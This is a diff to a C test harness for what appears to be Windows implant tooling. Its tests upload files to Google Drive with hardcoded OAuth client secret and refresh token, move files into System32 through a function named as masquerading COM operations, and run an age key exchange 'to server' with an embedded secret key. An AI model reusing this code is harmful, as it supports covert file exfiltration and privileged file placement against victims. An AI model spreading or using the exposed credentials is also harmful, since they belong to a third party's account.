@@ -193,7 +193,7 @@ void test5() {
 	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
 	CHAR szClientSecret[] = "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";
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
-	PGOOGLE_DRIVE pGoogleDriverObj = NULL;
+	PDRIVE_CONFIG pGoogleDriverObj = NULL;
 	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
 	RefreshAccessToken(pGoogleDriverObj);
 	GoogleDriveUpload(pGoogleDriverObj, L"C:\\Users\\Admin\\Downloads\\json.hpp");
@@ -205,7 +205,7 @@ void test6() {
 	CHAR szClientSecret[] = "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";
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
 	LPSTR lpFileId = NULL;
-	PGOOGLE_DRIVE pGoogleDriverObj = NULL;
+	PDRIVE_CONFIG pGoogleDriverObj = NULL;
 	pGoogleDriverObj = GoogleDriveInit(szUserAgent, szClientId, szClientSecret, szRefreshToken);
 	RefreshAccessToken(pGoogleDriverObj);
 	if (!GetFileId(pGoogleDriverObj, "11-7-2024-16-55-12.hpp", &lpFileId) || lpFileId == NULL) {
@@ -558,7 +558,7 @@ void test27() {
 }
 
 void test28() {
-	MasqueradedMoveDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
+	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\a.txt", L"C:\\Windows\\System32", FALSE);
 }
 
 void test29()
@@ -679,7 +679,7 @@ void test32() {
 }
 
 void test33() {
-	MasqueradedMoveDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexli", L"C:\\Windows\\System32", FALSE);
+	MasqueradedMoveCopyDirectoryFileCOM(L"C:\\Users\\Admin\\Desktop\\ida.hexli", L"C:\\Windows\\System32", FALSE);
 }
 
 void test34() {
@@ -692,6 +692,29 @@ void test34() {
 	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 	CloseHandle(pi.hThread);
 	CloseHandle(pi.hProcess);
+}
+
+void test35() {
+	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
+	BYTE PrivateKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
+	BYTE PublicKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
+	PBYTE pCipherText = NULL;
+	DWORD cbCipherText = 0;
+	BYTE PlainText[] = { 10, 32, 207, 232, 22, 198, 58, 9, 197, 243, 173, 16, 93, 130, 177, 56, 205, 148, 33, 17, 156, 162, 199, 197, 246, 217, 49, 150, 20, 146, 123, 199, 136, 248 };
+
+	pCipherText = AgeKeyExToServer(szRecipientPubKey, PrivateKey, PublicKey, PlainText, _countof(PlainText), &cbCipherText);
+	HexDump(pCipherText, cbCipherText);
+	FREE(pCipherText);
+}
+
+void test36() {
+	CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
+	DWORD cbOutput = 0;
+	LPSTR lpOutput = NULL;
+
+	lpOutput = Base64Decode(szEncodedStr, &cbOutput);
+	printf("lpOutput: %s, cbOutput: %d\n", lpOutput, cbOutput);
+	FREE(lpOutput);
 }
 
 VOID DetectMonitorSystem() {
@@ -735,7 +758,7 @@ int main() {
 	//test12();
 	//test13();
 	//test14();
-	test15();
+	//test15();
 	//test16();
 	//test17();
 	//test18();
@@ -755,5 +778,7 @@ int main() {
 	//test32();
 	//test33();
 	//test34();
+	//test35();
+	test36();
 	return 0;
 }
